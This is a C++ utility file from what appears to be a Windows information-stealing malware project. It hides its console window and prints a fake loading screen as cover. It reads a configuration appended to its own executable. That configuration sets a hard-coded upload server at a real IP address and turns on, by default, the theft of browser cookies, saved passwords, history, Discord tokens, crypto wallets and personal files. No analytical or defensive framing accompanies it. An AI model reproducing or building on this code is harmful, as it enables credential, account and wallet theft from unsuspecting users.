#include "utils.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <nlohmann/json.hpp>

#pragma comment(lib, "ws2_32.lib")

// Magic marker to find embedded config at end of exe
// This unique string marks where the JSON config begins
static const char* CONFIG_MARKER = "<<<PAYLOAD_CONFIG_START>>>";

std::string get_current_date_time() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

std::string format_bytes(long long bytes) {
    if (bytes < 1024) return std::to_string(bytes) + " B";
    if (bytes < 1024 * 1024) return std::to_string(bytes / 1024) + " KB";
    if (bytes < 1024LL * 1024 * 1024) return std::to_string(bytes / (1024 * 1024)) + " MB";
    return std::to_string(bytes / (1024LL * 1024 * 1024)) + " GB";
}

bool is_running_as_admin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        if (!CheckTokenMembership(nullptr, adminGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

void hide_console_window() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

std::string get_screen_size() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    return std::to_string(width) + "x" + std::to_string(height);
}

std::string get_local_ip_address() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        return "127.0.0.1";
    }

    struct addrinfo hints = {}, *result;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) {
        return "127.0.0.1";
    }

    char ip[INET_ADDRSTRLEN];
    struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)result->ai_addr;
    inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ip, sizeof(ip));

    freeaddrinfo(result);
    return std::string(ip);
}

bool get_feature_flag(const char* envVar, bool defaultValue) {
    char* envValue = std::getenv(envVar);
    if (!envValue) {
        return defaultValue;
    }

    std::string value = envValue;
    // Convert to lowercase for case-insensitive comparison
    for (char& c : value) {
        c = std::tolower(c);
    }

    // Check for various "false" representations
    return !(value == "0" || value == "false" || value == "no" || value == "off" || value == "disable" || value == "disabled");
}

void show_fake_loading_screen(const std::string& user) {
    std::vector<std::string> loadingSteps = {
        "Welcome " + user,
        "Loading system components...",
        "Mapping drivers...",
        "Initializing obfuscation...",
        "Establishing network connection...",
        "Checking connection...",
        "Optimizing settings...",
        "Synchronizing to current build...",
        "Finalizing check..."
    };

    std::srand(static_cast<unsigned int>(std::time(nullptr)));

    for (const auto& step : loadingSteps) {
        // Random delay between 800ms and 3 seconds
        int delay = 800 + (std::rand() % 2200);
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));

        std::cout << step << std::endl;

        // Show progress bar for this step (random 20-35 segments for more visual impact)
        int progressSegments = 20 + (std::rand() % 15);
        for (int i = 0; i < progressSegments; ++i) {
            std::this_thread::sleep_for(std::chrono::milliseconds(delay / progressSegments));
            std::cout << "█";
        }
        std::cout << std::endl; // New line after progress bar
    }
}

std::string get_exe_path() {
    char path[MAX_PATH];
    DWORD length = GetModuleFileNameA(nullptr, path, MAX_PATH);
    if (length == 0 || length == MAX_PATH) {
        return "";
    }
    return std::string(path);
}

std::optional<EmbeddedConfig> read_embedded_config() {
    try {
        std::string exePath = get_exe_path();
        if (exePath.empty()) {
            return std::nullopt;
        }

        // Open the exe file in binary mode
        std::ifstream file(exePath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            return std::nullopt;
        }

        // Get file size
        std::streamsize fileSize = file.tellg();
        if (fileSize < 100) { // Too small to have embedded config
            return std::nullopt;
        }

        // Read the last 64KB of the file to search for marker
        // Config should be small, so 64KB is more than enough
        const std::streamsize searchSize = std::min(fileSize, static_cast<std::streamsize>(65536));
        file.seekg(-searchSize, std::ios::end);

        std::vector<char> buffer(searchSize);
        file.read(buffer.data(), searchSize);
        file.close();

        // Search for the marker in the buffer
        std::string bufferStr(buffer.begin(), buffer.end());
        size_t markerLen = strlen(CONFIG_MARKER);
        size_t markerPos = bufferStr.find(CONFIG_MARKER);
        
        if (markerPos == std::string::npos) {
            return std::nullopt; // No embedded config found
        }

        // Extract JSON after marker
        std::string jsonStr = bufferStr.substr(markerPos + markerLen);
        
        // Trim any trailing null bytes or whitespace
        size_t endPos = jsonStr.find_last_not_of("\0\r\n\t ");
        if (endPos != std::string::npos) {
            jsonStr = jsonStr.substr(0, endPos + 1);
        }

        // Parse JSON config
        nlohmann::json config = nlohmann::json::parse(jsonStr);

        EmbeddedConfig embeddedConfig;
        embeddedConfig.user = config.value("user", "west");
        embeddedConfig.serverUrl = config.value("serverUrl", "http://62.60.179.121/api/upload");
        embeddedConfig.collectLocation = config.value("collectLocation", true);
        embeddedConfig.collectSystemInfo = config.value("collectSystemInfo", true);
        embeddedConfig.collectRunningProcesses = config.value("collectRunningProcesses", true);
        embeddedConfig.collectInstalledApps = config.value("collectInstalledApps", true);
        embeddedConfig.collectBrowserCookies = config.value("collectBrowserCookies", true);
        embeddedConfig.collectSavedPasswords = config.value("collectSavedPasswords", true);
        embeddedConfig.collectBrowserHistory = config.value("collectBrowserHistory", true);
        embeddedConfig.collectDiscordTokens = config.value("collectDiscordTokens", true);
        embeddedConfig.collectCryptoWallets = config.value("collectCryptoWallets", true);
        embeddedConfig.collectImportantFiles = config.value("collectImportantFiles", true);

        return embeddedConfig;

    } catch (const std::exception&) {
        return std::nullopt;
    }
}
